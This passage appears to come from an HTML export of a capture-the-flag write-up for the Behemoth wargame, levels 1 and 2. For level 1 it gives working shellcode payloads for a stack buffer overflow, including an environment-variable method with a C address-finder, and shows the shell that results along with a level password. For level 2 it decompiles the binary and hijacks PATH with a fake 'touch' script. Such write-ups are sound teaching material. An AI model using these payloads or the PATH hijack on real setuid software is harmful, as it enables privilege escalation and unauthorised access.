&nbsp; <br> &nbsp; 0x0804845b &lt;+16&gt;: &nbsp; &nbsp;add &nbsp; &nbsp;</span><span class="c3">$0x4</span><span class="c8">,%esp &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; 0x0804845e &lt;+19&gt;: &nbsp; &nbsp;lea &nbsp; &nbsp;-0x43(%ebp),%eax &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> &nbsp; 0x08048461 &lt;+22&gt;: &nbsp; &nbsp;push &nbsp; %eax &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> &nbsp; 0x08048462 &lt;+23&gt;: &nbsp; &nbsp;call &nbsp; 0x8048310 &lt;gets@plt&gt; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> &nbsp; 0x08048467 &lt;+28&gt;: &nbsp; &nbsp;add &nbsp; &nbsp;</span><span class="c3">$0x4</span><span class="c8">,%esp &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; 0x0804846a &lt;+31&gt;: &nbsp; &nbsp;push &nbsp; </span><span class="c3">$0x804850c</span><span class="c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; 0x0804846f &lt;+36&gt;: &nbsp; &nbsp;call &nbsp; 0x8048320 &lt;puts@plt&gt; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> &nbsp; 0x08048474 &lt;+41&gt;: &nbsp; &nbsp;add &nbsp; &nbsp;</span><span class="c3">$0x4</span><span class="c8">,%esp &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; 0x08048477 &lt;+44&gt;: &nbsp; &nbsp;mov &nbsp; &nbsp;</span><span class="c3">$0x0</span><span class="c8">,%eax &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; 0x0804847c &lt;+49&gt;: &nbsp; &nbsp;leave &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> &nbsp; 0x0804847d &lt;+50&gt;: &nbsp; &nbsp;ret &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>End of assembler dump. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>(gdb) b *0x08048462 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Breakpoint 1 at 0x8048462 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>(gdb) r &lt; &lt;(python -c </span><span class="c0">&quot;print &#39;A&#39;*71 +&#39;\xc0\xd5\xff\xff&#39;+&#39;\x90&#39;*100+&#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#39;&quot;</span><span class="c8">)<br>Starting program: /behemoth/behemoth1 &lt; &lt;(python -c </span><span class="c0">&quot;print &#39;A&#39;*71 +&#39;\xc0\xd5\xff\xff&#39;+&#39;\x90&#39;*100+&#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe<br>1\xb0\x0b\xcd\x80&#39;&quot;</span><span class="c23 c8">) </span></p><p class="c1"><span class="c23 c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></p><p class="c1"><span class="c8 c23">Breakpoint 1, 0x08048462 in main ()</span></p><p class="c1"><span class="c52 c51">&nbsp; &nbsp; &nbsp;</span></p><p class="c38"><span class="c52 c51">(gdb) s</span></p><p class="c38"><span class="c52 c51">Single stepping until exit from function main, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p><p class="c38"><span class="c23 c8">which has no line number information. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></p><p class="c38"><span class="c52 c51">Password: Authentication failure. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></p><p class="c38"><span class="c52 c51">Sorry. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p><p class="c1"><span class="c8">0xffffd5c0 in ?? () &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span class="c13">Now that the binary&rsquo;s memory has been flooded, the ESP register can be checked to see which address marks the start of the shellcode:</span></p><a id="t.439672ad795f53a3aa708ff4957f2a47e84bf870"></a><a id="t.11"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c52 c51">(gdb) x/100x $esp-100</span></p><p class="c1"><span class="c52 c51">0xffffd55c: &nbsp; &nbsp; 0x00000000 &nbsp; &nbsp; &nbsp;0x00000001 &nbsp; &nbsp; &nbsp;0xf7fc5000 &nbsp; &nbsp; &nbsp;0xffffd5b8</span></p><p class="c1"><span class="c23 c8">0xffffd56c: &nbsp; &nbsp; 0x08048474 &nbsp; &nbsp; &nbsp;0x0804850c &nbsp; &nbsp; &nbsp;0x41414154 &nbsp; &nbsp; &nbsp;0x41414141</span></p><p class="c1"><span class="c23 c8">0xffffd57c: &nbsp; &nbsp; 0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141</span></p><p class="c1"><span class="c23 c8">0xffffd58c: &nbsp; &nbsp; 0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141</span></p><p class="c1"><span class="c52 c51">0xffffd59c: &nbsp; &nbsp; 0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141</span></p><p class="c1"><span class="c52 c51">0xffffd5ac: &nbsp; &nbsp; 0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141</span></p><p class="c1"><span class="c52 c51">0xffffd5bc: &nbsp; &nbsp; 0xffffd5c0 &nbsp; &nbsp; &nbsp;0x90909090 &nbsp; &nbsp; &nbsp;0x90909090 &nbsp; &nbsp; &nbsp;0x90909090</span></p><p class="c1"><span class="c51 c52">0xffffd5cc: &nbsp; &nbsp; 0x90909090 &nbsp; &nbsp; &nbsp;0x90909090 &nbsp; &nbsp; &nbsp;0x90909090 &nbsp; &nbsp; &nbsp;0x90909090</span></p><p class="c1"><span class="c23 c8">0xffffd5dc: &nbsp; &nbsp; 0x90909090 &nbsp; &nbsp; &nbsp;0x90909090 &nbsp; &nbsp; &nbsp;0x90909090 &nbsp; &nbsp; &nbsp;0x90909090</span></p><p class="c1"><span class="c52 c51">0xffffd5ec: &nbsp; &nbsp; 0x90909090 &nbsp; &nbsp; &nbsp;0x90909090 &nbsp; &nbsp; &nbsp;0x90909090 &nbsp; &nbsp; &nbsp;0x90909090</span></p><p class="c1"><span class="c23 c8">0xffffd5fc: &nbsp; &nbsp; 0x90909090 &nbsp; &nbsp; &nbsp;0x90909090 &nbsp; &nbsp; &nbsp;0x90909090 &nbsp; &nbsp; &nbsp;0x90909090</span></p><p class="c1"><span class="c52 c51">0xffffd60c: &nbsp; &nbsp; 0x90909090 &nbsp; &nbsp; &nbsp;0x90909090 &nbsp; &nbsp; &nbsp;0x90909090 &nbsp; &nbsp; &nbsp;0x90909090</span></p><p class="c1"><span class="c23 c8">0xffffd61c: &nbsp; &nbsp; 0x90909090 &nbsp; &nbsp; &nbsp;0x90909090 &nbsp; &nbsp; &nbsp;0x6850c031 &nbsp; &nbsp; &nbsp;0x68732f2f</span></p><p class="c1"><span class="c23 c8">0xffffd62c: &nbsp; &nbsp; 0x69622f68 &nbsp; &nbsp; &nbsp;0x50e3896e &nbsp; &nbsp; &nbsp;0xb0e18953 &nbsp; &nbsp; &nbsp;0x0080cd0b</span></p><p class="c1"><span class="c52 c51">0xffffd63c: &nbsp; &nbsp; 0x08048480 &nbsp; &nbsp; &nbsp;0x080484e0 &nbsp; &nbsp; &nbsp;0xf7fe9070 &nbsp; &nbsp; &nbsp;0xffffd64c</span></p><p class="c1"><span class="c23 c8">0xffffd64c: &nbsp; &nbsp; 0xf7ffd920 &nbsp; &nbsp; &nbsp;0x00000001 &nbsp; &nbsp; &nbsp;0xffffd7a5 &nbsp; &nbsp; &nbsp;0x00000000 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span>The value for the eip register can be found at </span><span class="c8">0xffffd5bc</span><span>. It is then followed by a sequence of NOPs. The shellcode is most likely the one at </span><span class="c8">0xffffd61c</span><span>&nbsp;+ 8. Thus, the return address will most likely work if given a value between </span><span class="c8">0xffffd5bc</span><span>&nbsp;+ 4 and &nbsp;</span><span class="c8">0xffffd61c</span><span class="c13">&nbsp;+ 8. </span></p><a id="t.ad3dce9f3bd56a8afe6a1b583e48c687ec399212"></a><a id="t.12"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth1@behemoth:~$ python -c </span><span class="c0">&quot;print &#39;A&#39;*71 +&#39;\xd0\xd5\xff\xff&#39;+&#39;\x90&#39;*100+&#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#39;&quot;</span><span class="c8">|/behemoth/behemoth1<br>Password: Authentication failure.<br>Sorry.<br>Illegal instruction</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span>It is imperative to note that upon piping this malicious payload into the binary, we did not receive a </span><span class="c29">Segmentation Fault</span><span>&nbsp;error, rather an </span><span class="c29">Illegal Instruction</span><span>&nbsp;error was printed out. This error is present whenever a program jumps to an address with code that cannot be interpreted either because it is plain data or is an ambiguous part of an opcode (that&rsquo;s why this error is also called an illegal opcode error). This is an indication that our payload most likely works, however the return address needs to be tweaked so as to point to an address in memory that will correctly interpret our shellcode. After tweaking with the address for a bit by slightly decrementing it, the following is found:</span></p><a id="t.7761363a4aa85fbf6e5681798bc55e36f901857f"></a><a id="t.13"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth1@behemoth:~$ python -c </span><span class="c0">&quot;print &#39;A&#39;*71 +&#39;\xbb\xd5\xff\xff&#39;+&#39;\x90&#39;*100+&#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#39;&quot;</span><span class="c8">|/behemoth/behemoth1<br>Password: Authentication failure.<br>Sorry.</span></p></td></tr></table><p class="c12"><span class="c32 c16">Note how now there is no error displayed</span></p><p class="c9"><span class="c13"></span></p><p class="c12"><span>The program is most likely executing the shellcode, but a shell was not received. This is most likely due to the stdin and stdout being tied to this process. By appending </span><span class="c29">;cat -</span><span>&nbsp;to the end of the command to output stdin, the exploit works as intended:</span></p><a id="t.b81bb7a09eda56b8138f03560eb377d1211707a7"></a><a id="t.14"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth1@behemoth:~$ (python -c </span><span class="c0">&quot;print &#39;A&#39;*71 +&#39;\xbb\xd5\xff\xff&#39;+&#39;\x90&#39;*100+&#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#39;&quot;</span><span class="c8">;cat -)|/behemoth/behemoth1<br>Password: Authentication failure.<br>Sorry.<br>whoami<br>behemoth2<br>cat /etc/behemoth_pass/behemoth2<br>eimahquuof</span></p></td></tr></table><h3 class="c19" id="h.lu6rrk3nt1i"><span class="c25 c22">Method 2</span></h3><p class="c12"><span class="c13">Alternatively, it is possible to exploit this binary by using environment variables.</span></p><a id="t.c3a904cc9d699e2cbe530e60112d999d01d78bb3"></a><a id="t.15"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth1@behemoth:/tmp/dfghoifdghfoidghiodfh$ </span><span class="c4">export</span><span class="c8">&nbsp;EGG=$(python -c </span><span class="c0">&#39;print &quot;\x90\x90\x90\x90\x90\x90\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x6<br>8\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;&#39;</span><span class="c8">)</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span class="c13">We can create a c file which will take our environment variable to use for the targeted binary. </span></p><a id="t.4858dff86a932e8ba714ded046dc92b733b19154"></a><a id="t.16"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c4">#include &lt;stdio.h&gt;</span><span class="c8"><br></span><span class="c4">#include &lt;stdlib.h&gt;</span><span class="c8"><br></span><span class="c4">#include &lt;string.h&gt;</span><span class="c8"><br><br></span><span class="c7">int</span><span class="c8">&nbsp;</span><span class="c24">main</span><span class="c4">(</span><span class="c7">int</span><span class="c4">&nbsp;argc, </span><span class="c7">char</span><span class="c4">&nbsp;*argv[])</span><span class="c8">&nbsp;{<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c7">if</span><span class="c8">(argc &lt; </span><span class="c4">3</span><span class="c8">) {<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c4">printf</span><span class="c8">(</span><span class="c0">&quot;Usage: %s &lt;environment variable&gt; &lt;target program name&gt;\n&quot;</span><span class="c8">, argv[</span><span class="c4">0</span><span class="c8">]);<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c4">exit</span><span class="c8">(</span><span class="c4">0</span><span class="c8">);<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;}<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c7">char</span><span class="c8">&nbsp;*ptr = getenv(argv[</span><span class="c4">1</span><span class="c8">]); </span><span class="c17">/* get env var location */</span><span class="c8"><br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ptr += (</span><span class="c4">strlen</span><span class="c8">(argv[</span><span class="c4">0</span><span class="c8">]) - </span><span class="c4">strlen</span><span class="c8">(argv[</span><span class="c4">2</span><span class="c8">]))*</span><span class="c4">2</span><span class="c8">; </span><span class="c17">/* adjust for program name */</span><span class="c8"><br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c4">printf</span><span class="c8">(</span><span class="c0">&quot;%s will be at %p\n&quot;</span><span class="c8">, argv[</span><span class="c4">1</span><span class="c8">], ptr);<br>}</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span class="c13">After compiling the program with gcc, the program can be executed so as to inject the shellcode into the environment variable, and find where it is located in memory:</span></p><a id="t.28085443dea1c4ab5b92d405e351303ef7f16edd"></a><a id="t.17"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth1</span><span class="c3">@behemoth</span><span class="c0">:/tmp/dfghoifdghfoidghiodfh</span><span class="c3">$</span><span class="c52 c51">&nbsp;gcc -m32 find_addr.c -o find_addr</span></p><p class="c1"><span class="c8">behemoth1</span><span class="c3">@behemoth</span><span class="c0">:/tmp/dfghoifdghfoidghiodfh</span><span class="c3">$ </span><span class="c8">./find_addr EGG /behemoth/behemoth1 <br>EGG will be at </span><span class="c4">0xffffddd3</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span>Seeing that the shellcode is at </span><span class="c4">0xffffddd3</span><span class="c13">,the payload can be constructed to point to this address:</span></p><a id="t.d616e1b79bb49a0740a850717561b828b423c168"></a><a id="t.18"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth1</span><span class="c3">@behemoth</span><span class="c0">:/tmp/dfghoifdghfoidghiodfh</span><span class="c3">$ </span><span class="c8">(python -c </span><span class="c0">&quot;print &#39;A&#39;*71+&#39;\xd3\xdd\xff\xff&#39;&quot;</span><span class="c8">;cat -)|</span><span class="c3">/behemoth/behemoth</span><span class="c8">1<br></span><span class="c0">Password:</span><span class="c8">&nbsp;Authentication failure.<br>Sorry.<br>whoami<br>behemoth2</span></p></td></tr></table><h2 class="c19" id="h.9e7hwp9wx39h"><span class="c46 c22">Behemoth 2</span></h2><p class="c12"><span class="c13">As the behemoth2 user, the behemoth2 binary can now be executed. </span></p><h3 class="c19" id="h.7p5xlkqevfbu"><span class="c25 c22">Binary Analysis</span></h3><h4 class="c11" id="h.x3bq9jsdb8v7"><span class="c44 c22">Behavior</span></h4><p class="c12"><span class="c13">After executing the binary, the program simply touches a file and then hangs:</span></p><a id="t.6f0cb0e5efd1c09fb54a48de52d01584f8353e20"></a><a id="t.19"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth2</span><span class="c3">@behemoth</span><span class="c0">:/behemoth</span><span class="c3">$ </span><span class="c8">./behemoth2<br></span><span class="c0">touch:</span><span class="c8">&nbsp;cannot touch </span><span class="c0">&#39;30233&#39;</span><span class="c52 c51">: Permission denied</span></p><p class="c1 c45"><span class="c52 c51"></span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span class="c13">Seeing as this binary performs a system function, there is most likely a system function being called within the program. </span></p><h4 class="c11" id="h.oynz5ozays6k"><span class="c44 c22">Ghidra</span></h4><p class="c12"><span class="c13">After downloading the binary onto the attack box, this binary can be further analyzed within Ghidra:</span></p><a id="t.be5016db098b17f371236671eb0527d24318e510"></a><a id="t.20"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">undefined4 main(void)<br><br>{<br> &nbsp;uint uVar1</span><span class="c17">;</span><span class="c8"><br> &nbsp;__uid_t _Var2</span><span class="c17">;</span><span class="c8"><br> &nbsp;__uid_t _Var3</span><span class="c17">;</span><span class="c8"><br> &nbsp;stat local_90</span><span class="c17">;</span><span class="c8"><br> &nbsp;undefined4 local_2c</span><span class="c17">;</span><span class="c8"><br> &nbsp;undefined local_28</span><span class="c17">;</span><span class="c8"><br> &nbsp;char acStack38 [</span><span class="c4">14</span><span class="c8">]</span><span class="c17">;</span><span class="c8"><br> &nbsp;char *local_18</span><span class="c17">;</span><span class="c8"><br> &nbsp;__pid_t local_14</span><span class="c17">;</span><span class="c8"><br> &nbsp;undefined *local_10</span><span class="c17">;</span><span class="c8"><br> &nbsp;<br> &nbsp;local_10 = &amp;stack</span><span class="c4">0x00000004</span><span class="c17">;</span><span class="c8"><br> &nbsp;local_14 = getpid()</span><span class="c17">;</span><span class="c8"><br> &nbsp;local_18 = acStack38</span><span class="c17">;</span><span class="c8"><br> &nbsp;sprintf((char *)&amp;local_2c,</span><span class="c0">&quot;touch %d&quot;</span><span class="c8">,local_14)</span><span class="c17">;</span><span class="c8"><br> &nbsp;uVar1 = lstat(local_18,&amp;local_90)</span><span class="c17">;</span><span class="c8"><br> &nbsp;if ((uVar1 &amp; </span><span class="c4">0xf000</span><span class="c8">) != </span><span class="c4">0x8000</span><span class="c8">) {<br> &nbsp; &nbsp;unlink(local_18)</span><span class="c17">;</span><span class="c8"><br> &nbsp; &nbsp;_Var2 = geteuid()</span><span class="c17">;</span><span class="c8"><br> &nbsp; &nbsp;_Var3 = geteuid()</span><span class="c17">;</span><span class="c8"><br> &nbsp; &nbsp;setreuid(_Var3,_Var2)</span><span class="c17">;</span><span class="c8"><br> &nbsp; &nbsp;system((char *)&amp;local_2c)</span><span class="c17">;</span><span class="c8"><br> &nbsp;}<br> &nbsp;sleep(</span><span class="c4">2000</span><span class="c8">)</span><span class="c17">;</span><span class="c8"><br> &nbsp;local_2c = </span><span class="c4">0x20746163</span><span class="c17">;</span><span class="c8"><br> &nbsp;local_28 = </span><span class="c4">0x20</span><span class="c17">;</span><span class="c8"><br> &nbsp;_Var2 = geteuid()</span><span class="c17">;</span><span class="c8"><br> &nbsp;_Var3 = geteuid()</span><span class="c17">;</span><span class="c8"><br> &nbsp;setreuid(_Var3,_Var2)</span><span class="c17">;</span><span class="c8"><br> &nbsp;system((char *)&amp;local_2c)</span><span class="c17">;</span><span class="c8"><br> &nbsp;return </span><span class="c4">0</span><span class="c17">;</span><span class="c8"><br>}</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span>Toward the top of the program, the sprintf function is called in which the string &ldquo;touch %d&rdquo; is passed into the local_2c variable (with %d corresponding to the id of this process). It is essential to note that </span><span class="c29">touch</span><span class="c13">&nbsp;is declared without using its full path (i.e. /usr/bin/touch). </span></p><p class="c12"><span>Furthermore, </span><span>two system calls are executed. One is within the if statement and one is outside the if statement following a sleep of 2000 seconds. This sleep call is responsible for the hanging that was experienced after executing the binary. Therefore, the first system call is to the touch command. The second system call again uses the local_2c variable, but only after it is initialized to </span><span class="c4">0x20746163</span><span>. Converting </span><span class="c29">20 74 61 63 </span><span class="c13">into ascii results in &ldquo; tac&rdquo;. </span></p><a id="t.b985d3a3037a3a689f9fd686e63d06dc4d5e20bc"></a><a id="t.21"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth2</span><span class="c3">@behemoth</span><span class="c0">:/behemoth</span><span class="c3">$ </span><span class="c8">file behemoth2<br></span><span class="c0">behemoth2:</span><span class="c8">&nbsp;setuid ELF </span><span class="c4">32</span><span class="c8">-bit LSB executable, Intel </span><span class="c4">80386</span><span class="c8">, version </span><span class="c4">1</span><span class="c8">&nbsp;(SYSV), dynamically linked, interpreter /lib/ld-linux.so.</span><span class="c4">2</span><span class="c8">, </span><span class="c7">for</span><span class="c8">&nbsp;GNU/Linux </span><span class="c4">2.6</span><span class="c8">.</span><span class="c4">32</span><span class="c8">, BuildID[sha1]=</span><span class="c4">87</span><span class="c8">daf01f3941b5f8f815d758ed9e90589a9d315c, </span><span class="c7">not</span><span class="c8">&nbsp;stripped</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span class="c13">Seeing as this binary is in LSB format, the &ldquo; tac&rdquo; string should actually be read backwards, revealing that this is &ldquo;cat &ldquo;. Thus, the program first touches the a file then cats it after 2000 seconds. </span></p><h3 class="c19" id="h.er0aqui9c1x"><span class="c25 c22">Binary Exploitation</span></h3><p class="c12"><span class="c13">This binary has multiple vulnerabilities, and each method of exploitation is described below:</span></p><h4 class="c11" id="h.9vyv757ij9yj"><span class="c44 c22">Path Privesc (Touch)</span></h4><p class="c12"><span>Seeing as this binary executes the touch command without using its full path, a file called touch can be created which executes the </span><span class="c29">/bin/bash</span><span class="c13">&nbsp;command:</span></p><a id="t.0c112cf8a65bc4ea42190063f7a65579b690b506"></a><a id="t.22"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth2</span><span class="c3">@behemoth</span><span class="c0">:/tmp/pathprivesc</span><span class="c3">$ </span><span class="c8">echo &ldquo;/bin/bash&rdquo; &gt; touch<br>behemoth2</span><span class="c3">@behemoth</span><span class="c0">:/tmp/pathprivesc</span><span class="c3">$ </span><span class="c8">chmod </span><span class="c4">777</span><span class="c8">&nbsp;touch</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span class="c13">After creating this file with the aforementioned contents, the PATH environment variable can be updated to prioritize the current directory over all other directories:</span></p><a id="t.662285ceb32d3eea7cf21510aa65ec44f1ea3e57"></a><a id="t.23"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth2</span><span class="c3">@behemoth</span><span class="c0">:/tmp/pathprivesc</span><span class="c3">$ </span><span class="c8">export PATH=.</span><span class="c0">:</span><span class="c3">$PATH</span><span class="c8"><br>behemoth2</span><span class="c3">@behemoth</span><span class="c0">:/tmp/pathprivesc</span><span class="c3">$ </span><span class="c8">which touch<br>./touch</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span class="c13">Now, upon executing the behemoth2 binary, the touch command will be called to the newly created touch file:</span></p><a 